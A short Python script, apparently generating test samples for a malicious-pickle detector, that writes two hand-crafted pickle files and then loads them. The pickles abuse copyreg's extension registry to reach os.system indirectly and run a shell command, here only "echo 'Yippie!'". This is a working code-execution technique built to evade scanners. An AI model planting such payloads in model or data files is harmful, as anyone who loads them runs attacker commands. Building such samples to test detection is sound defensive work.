import pickle
ROOT = "./models/malicious/ext_injection/ext_injection/"

with open(f"{ROOT}/add_extension.pkl", "wb") as f:
    f.write(b"\x80\x04ccopyreg\nadd_extension\nVos\nVsystem\nI1\n\x87R\x82\x01Vecho 'Yippie!'\n\x85R.")
with open(f"{ROOT}/add_extension.pkl", "rb") as f:
    pickle.load(f)
    
with open(f"{ROOT}/inverted_registry.pkl", "wb") as f:
    f.write(b"\x80\x04ccopyreg\n_inverted_registry\nI1\nVos\nVsystem\n\x86s\x82\x01Vecho 'Yippie!'\n\x85R.")
with open(f"{ROOT}/inverted_registry.pkl", "rb") as f:
    pickle.load(f)
